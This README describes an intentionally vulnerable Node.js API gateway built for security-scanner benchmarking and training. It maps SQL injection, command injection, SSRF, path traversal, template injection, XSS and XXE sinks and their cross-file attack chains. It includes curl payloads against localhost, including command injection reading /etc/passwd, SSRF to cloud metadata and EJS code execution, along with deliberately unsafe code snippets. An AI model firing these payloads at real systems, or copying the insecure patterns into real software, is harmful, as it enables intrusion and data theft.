# VulnerableAPIGateway

A deliberately vulnerable Node.js API Gateway application designed for security testing and SAST/DAST tool evaluation. This application demonstrates various vulnerability patterns with **custom sources, sinks, and multi-chain cross-file attack vectors**.

## ⚠️ WARNING

This application is **intentionally vulnerable** and should **NEVER** be deployed in production or exposed to the internet. It is designed solely for:

- Security scanner testing and evaluation
- SAST tool benchmarking
- Educational purposes
- Penetration testing practice

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                     VulnerableAPIGateway                         │
├─────────────────────────────────────────────────────────────────┤
│  SOURCES                          │  SINKS                       │
│  ├── HTTP (body, query, headers)  │  ├── SQL Injection           │
│  ├── WebSocket messages           │  ├── Command Injection        │
│  ├── File uploads                 │  ├── SSRF                     │
│  ├── JWT claims (unverified)      │  ├── Path Traversal           │
│  ├── SAML assertions (XXE)        │  ├── Template Injection       │
│  ├── External API responses       │  ├── XSS (Reflected/Stored)   │
│  ├── Webhook payloads             │  ├── XXE                      │
│  └── Environment variables        │  └── Log Injection            │
├─────────────────────────────────────────────────────────────────┤
│  CROSS-FILE TAINT PROPAGATION                                    │
│  routes/ → services/ → sinks/                                    │
│  sources/ → middleware/ → routes/ → sinks/                       │
│  WebSocket → services/ → multiple sinks                          │
└─────────────────────────────────────────────────────────────────┘
```

## Directory Structure

```
VulnerableAPIGateway/
├── server.js                    # Main Express server
├── config/
│   └── database.js              # DB config with SQL injection sinks
├── sources/
│   ├── HttpSource.js            # HTTP request sources
│   └── ExternalSource.js        # External API, DNS, socket sources
├── sinks/
│   ├── CommandSink.js           # Command injection sinks
│   ├── FileSink.js              # Path traversal sinks
│   ├── NetworkSink.js           # SSRF sinks
│   └── TemplateSink.js          # Template injection & XSS sinks
├── middleware/
│   ├── authMiddleware.js        # Auth bypass, JWT, SAML vulnerabilities
│   └── loggingMiddleware.js     # Log injection
├── routes/
│   ├── apiRoutes.js             # Main API endpoints
│   ├── adminRoutes.js           # Admin functionality
│   ├── webhookRoutes.js         # External webhook handlers
│   └── fileRoutes.js            # File upload/download
├── services/
│   ├── DataTransformService.js  # Cross-file taint propagation
│   └── WebSocketService.js      # WebSocket vulnerabilities
└── utils/
    ├── sanitizers.js            # Weak sanitization (bypassable)
    └── dataFlowHelpers.js       # Taint relay and transform helpers
```

## Vulnerability Categories

### 1. SQL Injection

| Location | Type | Taint Flow |
|----------|------|------------|
| `config/database.js:QueryBuilder` | String concatenation | HTTP body → QueryBuilder |
| `config/database.js:AuditLogger` | Second-order injection | HTTP → Store → Query |
| `routes/apiRoutes.js:/users/search` | Cross-file | HTTP → Service → QueryBuilder |
| `middleware/authMiddleware.js` | API key validation | Header → QueryBuilder |

### 2. Command Injection

| Location | Type | Taint Flow |
|----------|------|------------|
| `sinks/CommandSink.js` | exec, execSync, spawn | Various sources |
| `routes/apiRoutes.js:/system/execute` | Cross-file | HTTP → Service → CommandSink |
| `routes/adminRoutes.js` | System management | HTTP → CommandSink |
| `services/WebSocketService.js` | WebSocket commands | WS → CommandSink |

### 3. Server-Side Request Forgery (SSRF)

| Location | Type | Taint Flow |
|----------|------|------------|
| `sinks/NetworkSink.js:SsrfSink` | URL fetch, redirects | HTTP body → axios |
| `routes/apiRoutes.js:/proxy/fetch` | Cross-file proxy | HTTP → Service → SsrfSink |
| `routes/webhookRoutes.js` | Callback URLs | Webhook → SsrfSink |
| `routes/fileRoutes.js:/fetch-and-process` | Multi-chain | HTTP → SSRF → File |

### 4. Path Traversal

| Location | Type | Taint Flow |
|----------|------|------------|
| `sinks/FileSink.js:PathTraversalSink` | Read/write/delete | Various sources |
| `routes/fileRoutes.js` | File operations | HTTP → PathTraversalSink |
| `sinks/FileSink.js:ArchiveSink` | Zip Slip | Archive → Extract |

### 5. Template Injection (SSTI)

| Location | Type | Taint Flow |
|----------|------|------------|
| `sinks/TemplateSink.js` | EJS, Pug, Handlebars, Nunjucks | Various sources |
| `routes/apiRoutes.js:/render` | Cross-file | HTTP → TemplateSink |
| `routes/adminRoutes.js:/templates/manage` | All engines | HTTP → TemplateSink |

### 6. Cross-Site Scripting (XSS)

| Location | Type | Taint Flow |
|----------|------|------------|
| `sinks/TemplateSink.js:XssSink` | Reflected | HTTP query → Response |
| `routes/apiRoutes.js:/search` | Reflected | Query param → HTML |
| `services/WebSocketService.js` | Stored | WS message → Broadcast |
| `routes/adminRoutes.js:/dashboard` | Stored | DB → HTML |

### 7. XML External Entity (XXE)

| Location | Type | Taint Flow |
|----------|------|------------|
| `sources/HttpSource.js:XmlSource` | Entity expansion | XML body → Parser |
| `middleware/authMiddleware.js` | SAML parsing | SAML → XmlSource |
| `routes/webhookRoutes.js:/soap` | SOAP endpoint | XML → XmlSource |

### 8. Authentication/Authorization

| Location | Type | Description |
|----------|------|-------------|
| `middleware/authMiddleware.js` | JWT bypass | Unverified claims |
| `middleware/authMiddleware.js` | SAML bypass | Optional signature |
| `middleware/authMiddleware.js` | IP spoofing | X-Forwarded-For trust |

## Multi-Chain Attack Vectors

### Chain 1: HTTP → SSRF → Command Injection
```
Source: req.body.callbackUrl, req.body.commandToRun
Flow:   POST /api/integration/webhook-execute
        → IntegrationService.processWebhookAndExecute()
        → SsrfSink.fetchUrl(callbackUrl)        [SSRF]
        → CommandSink.executeCommand(command)   [Command Injection]
```

### Chain 2: HTTP → Template → File Write
```
Source: req.body.template, req.body.outputPath
Flow:   POST /api/integration/render-save
        → IntegrationService.renderAndSave()
        → TemplateSink.renderEjs(template)      [SSTI]
        → PathTraversalSink.writeFile(path)     [Path Traversal]
```

### Chain 3: File Read → Template → XSS
```
Source: req.body.templatePath, req.body.context
Flow:   POST /api/integration/template-from-file
        → IntegrationService.processTemplateFile()
        → PathTraversalSink.readFile(path)      [Path Traversal]
        → TemplateSink.renderEjs(content)       [SSTI]
        → res.send(rendered)                    [XSS]
```

### Chain 4: WebSocket → Database → File
```
Source: WebSocket message
Flow:   WS action: 'processAndStore'
        → WebSocketEventHandler.processAndStore()
        → AuditLogger.logAction(userId)         [SQL Injection]
        → PathTraversalSink.writeFile(path)     [Path Traversal]
```

### Chain 5: External Webhook → SQL → XSS
```
Source: GitHub webhook payload
Flow:   POST /webhook/github
        → ExternalApiSource.parseWebhookPayload()
        → QueryBuilder.dynamicQuery()           [SQL Injection]
        → Stored in DB → Displayed in admin     [Stored XSS]
```

### Chain 6: File Upload → Archive → Command
```
Source: req.files.archive
Flow:   POST /files/upload/archive
        → ArchiveSink.extractZip()              [Zip Slip]
        → Extracted malicious script
        → POST /admin/system/manage
        → CommandSink.executeCommand()          [Command Injection]
```

### Chain 7: SAML → XXE → Session → XSS
```
Source: req.body.SAMLResponse
Flow:   POST /auth/saml/callback
        → XmlSource.parseXml()                  [XXE]
        → authMiddleware.validateSamlResponse()
        → req.session.user = taintedUser
        → GET /admin/dashboard
        → XssSink.sendHtml(user.email)          [Stored XSS]
```

## Custom Sources

| Source | Location | Data Type |
|--------|----------|-----------|
| HttpSource.getBodyData | sources/HttpSource.js | JSON, form data |
| HttpSource.getCustomHeaders | sources/HttpSource.js | Custom headers |
| JwtSource.extractClaims | sources/HttpSource.js | Unverified JWT |
| XmlSource.parseXml | sources/HttpSource.js | XML with XXE |
| ExternalApiSource.fetchFromUrl | sources/ExternalSource.js | External API |
| FileSource.readFile | sources/ExternalSource.js | File contents |
| WebSocket messages | services/WebSocketService.js | WS payload |

## Custom Sinks

| Sink | Location | Vulnerability |
|------|----------|---------------|
| CommandSink.executeCommand | sinks/CommandSink.js | Command Injection |
| DockerSink.dockerExec | sinks/CommandSink.js | Container Escape |
| SshSink.sshExecute | sinks/CommandSink.js | Remote Command |
| SsrfSink.fetchUrl | sinks/NetworkSink.js | SSRF |
| PathTraversalSink.readFile | sinks/FileSink.js | Arbitrary Read |
| ArchiveSink.extractZip | sinks/FileSink.js | Zip Slip |
| TemplateSink.renderEjs | sinks/TemplateSink.js | SSTI |
| XssSink.sendHtml | sinks/TemplateSink.js | XSS |
| QueryBuilder.findByField | config/database.js | SQL Injection |

## Taint Propagation Patterns

### Direct Flow
```javascript
// Source → Sink (same file)
const userInput = req.body.command;  // SOURCE
exec(userInput);                      // SINK
```

### Cross-File Flow
```javascript
// routes/apiRoutes.js (SOURCE)
const data = req.body;
const result = await DataTransformService.processSystemAction(data);

// services/DataTransformService.js (PROPAGATION)
static async processSystemAction(actionData) {
    const { command } = actionData;
    return await CommandSink.executeCommand(command);
}

// sinks/CommandSink.js (SINK)
static async executeCommand(command) {
    return await execPromise(command);
}
```

### Stored Flow
```javascript
// Step 1: Store tainted data
req.session.userPrefs = { customCss: req.body.css };

// Step 2: Later retrieve and use
const css = req.session.userPrefs.customCss;
res.send(`<style>${css}</style>`);  // Stored XSS
```

### Relay Flow
```javascript
// Data passes through multiple functions unchanged
const step1 = TaintRelay.passthrough(userInput);
const step2 = TaintRelay.arrayRelay(step1);
const step3 = TaintRelay.objectRelay(step2);
exec(step3);  // Still tainted after 3 hops
```

## Testing the Application

### Install Dependencies
```bash
npm install
```

### Run the Server
```bash
node server.js
```

### Example Attack Payloads

**SQL Injection:**
```bash
curl -X POST http://localhost:3000/api/users/search \
  -H "Content-Type: application/json" \
  -d '{"field":"id","value":"1 OR 1=1--"}'
```

**Command Injection:**
```bash
curl -X POST http://localhost:3000/api/system/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"ls","target":"; cat /etc/passwd"}'
```

**SSRF:**
```bash
curl -X POST http://localhost:3000/api/proxy/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

**Path Traversal:**
```bash
curl -X POST http://localhost:3000/api/files/read \
  -H "Content-Type: application/json" \
  -d '{"filename":"../../../etc/passwd"}'
```

**Template Injection:**
```bash
curl -X POST http://localhost:3000/api/render \
  -H "Content-Type: application/json" \
  -d '{"template":"<%= process.mainModule.require(\"child_process\").execSync(\"id\") %>","context":{},"engine":"ejs"}'
```

## License

This project is for educational purposes only. Use responsibly and ethically.
